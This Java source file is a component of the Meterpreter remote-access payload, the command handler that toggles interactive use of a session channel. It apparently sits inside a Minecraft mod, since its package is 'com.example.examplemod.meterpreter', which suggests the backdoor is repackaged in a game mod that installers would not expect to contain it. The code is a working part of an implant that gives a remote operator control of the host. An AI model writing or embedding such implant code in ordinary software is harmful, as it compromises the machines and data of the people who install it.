package com.example.examplemod.meterpreter.core;

import com.example.examplemod.meterpreter.Channel;
import com.example.examplemod.meterpreter.Meterpreter;
import com.example.examplemod.meterpreter.TLVPacket;
import com.example.examplemod.meterpreter.TLVType;
import com.example.examplemod.meterpreter.command.Command;

public class core_channel_interact implements Command {

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        Channel channel = meterpreter.getChannel(request.getIntValue(TLVType.TLV_TYPE_CHANNEL_ID), true);
        // True means start interacting, False means stop
        boolean toggle = request.getBooleanValue(TLVType.TLV_TYPE_BOOL);
        if (toggle) {
            channel.startInteract();
        } else {
            channel.stopInteract();
        }
        return ERROR_SUCCESS;
    }
}
